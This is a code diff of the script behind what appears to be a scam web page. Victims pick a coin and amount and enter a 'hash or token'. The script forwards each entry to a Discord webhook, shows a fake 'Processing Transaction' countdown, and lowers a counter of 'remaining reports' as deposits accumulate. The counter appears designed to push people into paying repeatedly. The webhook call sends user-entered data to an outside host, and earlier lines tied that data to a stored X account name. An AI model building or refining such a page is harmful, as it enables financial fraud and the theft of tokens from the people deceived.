-        const savedUser = JSON.parse(sessionStorage.getItem("x_user") || "{}");
+        const depositValue = parseInt(amountSelect.value, 10) || 50;
+        const progressPercent = depositValue / 5;
 
         sendToDiscordWebhook({
-            user: savedUser.name || "X Account User",
-            userId: `@${savedUser.username || "x_user"}`,
             coin: coinSelect.value,
             hashOrToken: input.value.trim(),
             amount: `$${depositValue}.00`
@@ -751,19 +291,15 @@
 
         if (countdownTimer) clearInterval(countdownTimer);
         let secondsLeft = 3;
-        const loadingScreen = document.getElementById("loadingScreen");
-        const loadingText = document.getElementById("loadingText");
-        loadingText.textContent = `Processing Token (${secondsLeft})`;
+        loadingText.textContent = `Processing Transaction (${secondsLeft})...`;
         loadingScreen.classList.remove("hidden");
-        bottomLeftLogo.style.display = "none";
 
         countdownTimer = setInterval(() => {
             secondsLeft--;
-            loadingText.textContent = `Processing Token (${secondsLeft})`;
+            loadingText.textContent = `Processing Transaction (${secondsLeft})...`;
             if (secondsLeft <= 0) {
                 clearInterval(countdownTimer);
                 loadingScreen.classList.add("hidden");
-                bottomLeftLogo.style.display = "block";
                 input.value = "";
                 currentProgress += progressPercent;
                 if (currentProgress >= 100) {
@@ -776,29 +312,17 @@
                 progressText.textContent = currentProgress + "%";
                 let remainingReports = Math.round(86 * (1 - (currentProgress / 100)));
                 reportCountDisplay.textContent = remainingReports;
-                reportCountDisplay.style.color = "#57d9a3";
-                setTimeout(() => {
-                    if (remainingReports > 0) {
-                        reportCountDisplay.style.color = "#d83a3a";
-                    }
-                }, 1000);
                 recentDepositDisplay.textContent = `$${depositValue.toFixed(2)}`;
                 totalDepositAmount += depositValue;
                 totalDepositDisplay.textContent = `$${totalDepositAmount.toFixed(2)}`;
                 coinSelect.selectedIndex = 0;
                 amountSelect.selectedIndex = 0;
-                input.placeholder = "Token ID...";
                 validateForm();
             }
         }, 1000);
     }
 
-    input.addEventListener("keydown", (event) => {
-        if (event.key === "Enter" && !enterBtn.disabled) handleSubmit();
-    });
-
     enterBtn.addEventListener("click", handleSubmit);
 </script>
-
 </body>
 </html>
